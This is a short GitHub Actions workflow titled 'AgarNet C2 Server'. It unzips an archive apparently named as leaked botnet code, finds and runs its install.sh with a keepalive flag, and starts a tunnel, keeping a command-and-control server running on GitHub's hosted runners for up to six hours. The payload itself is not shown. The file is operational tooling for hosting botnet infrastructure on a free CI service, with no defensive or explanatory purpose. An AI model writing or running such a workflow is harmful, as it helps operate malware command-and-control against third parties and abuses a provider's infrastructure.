name: AgarNet C2 Server
on:
  workflow_dispatch:
jobs:
  run-c2:
    runs-on: ubuntu-latest
    timeout-minutes: 360 # 6 hours uninterrupted runtime
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4
      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - name: Run C2 Installer & Start Tunnel
        run: |
          # 1. Unzip silently, overwrite existing
          unzip -q -o ./agarnetshitleakbyVessy1337.zip
          
          # 2. List extracted files (visible in Actions logs for debug)
          ls -la
          
          # 3. If install.sh is in root, run it; otherwise find it in subdirectory
          if [ -f "install.sh" ]; then
            chmod +x install.sh
            ./install.sh --keepalive
          else
            TARGET_DIR=$(find . -maxdepth 2 -name "install.sh" -exec dirname {} \;)
            if [ -n "$TARGET_DIR" ]; then
              cd "$TARGET_DIR"
              chmod +x install.sh
              ./install.sh --keepalive
            else
              echo "ERROR: install.sh not found in any directory!"
              exit 1
            fi
          fi
